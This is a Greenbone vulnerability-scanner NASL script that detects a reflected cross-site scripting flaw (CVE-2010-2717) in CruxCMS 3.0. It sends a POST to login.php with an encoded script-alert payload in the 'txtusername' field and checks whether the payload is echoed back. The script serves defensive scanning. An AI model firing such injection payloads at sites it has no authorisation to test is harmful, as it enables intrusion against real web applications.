# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:cruxsoftware:cruxcms";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801382");
  script_version("2023-07-28T16:09:07+0000");
  script_tag(name:"last_modification", value:"2023-07-28 16:09:07 +0000 (Fri, 28 Jul 2023)");
  script_tag(name:"creation_date", value:"2010-07-19 10:09:06 +0200 (Mon, 19 Jul 2010)");
  script_cve_id("CVE-2010-2717");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("CruxCMS 'txtusername' Parameter Cross Site Scripting Vulnerability");
  script_xref(name:"URL", value:"http://www.vupen.com/english/advisories/2010/1708");
  script_xref(name:"URL", value:"http://www.htbridge.ch/advisory/xss_vulnerability_in_cruxcms_1.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/512245/100/0/threaded");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_crux_products_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("cruxcms/detected");

  script_tag(name:"insight", value:"The flaw is caused by an input validation error in the
  'manager/login.php' script when processing the 'txtusername' parameter.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"CruxCMS is prone to a cross-site scripting (XSS) vulnerability.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to cause
  arbitrary scripting code to be executed by the user's browser in the security context of an affected site.");

  script_tag(name:"affected", value:"CruxCMS version 3.0");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!cmsPort = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:cmsPort, service:"www"))
  exit(0);

if(dir == "/")
  dir = "";

filename = string(dir + "/login.php");
authVariables ="txtusername=%22%3E%3Cscript%3Ealert%28123456%29%3C%2Fscript%3E&txtpassword=&cmdSubmit=Submit";
useragent = http_get_user_agent();

host = http_host_name(port:cmsPort);

sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "User-Agent: ", useragent, "\r\n",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                "Accept-Language: en-us,en;q=0.5\r\n",
                "Accept-Encoding: gzip,deflate\r\n",
                "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n",
                "Keep-Alive: 300\r\n",
                "Connection: keep-alive\r\n",
                "Referer: http://", host, filename, "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                authVariables);
rcvRes = http_keepalive_send_recv(port:cmsPort, data:sndReq);

if(rcvRes =~ "^HTTP/1\.[01] 200" && ">alert(123456)</script>" >< rcvRes){
  report = http_report_vuln_url(port:cmsPort, url:filename);
  security_message(port:cmsPort, data:report);
  exit(0);
}

exit(99);
